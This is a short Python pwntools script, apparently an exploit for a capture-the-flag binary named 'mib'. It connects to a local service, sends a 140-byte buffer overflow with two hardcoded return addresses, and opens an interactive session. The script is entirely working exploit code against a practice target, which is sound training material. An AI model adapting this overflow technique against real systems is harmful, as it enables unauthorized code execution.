from pwn import *
challengername= 'mib'

io = remote("127.0.0.1",21000)
io.sendline("5")
print io.recvline()
io.sendline("A")
print io.recvline()
io.sendline("A"*140+p32(0x0804f001)+"C"*16+p32(0x804a4f7))
print io.recvline()
io.interactive()


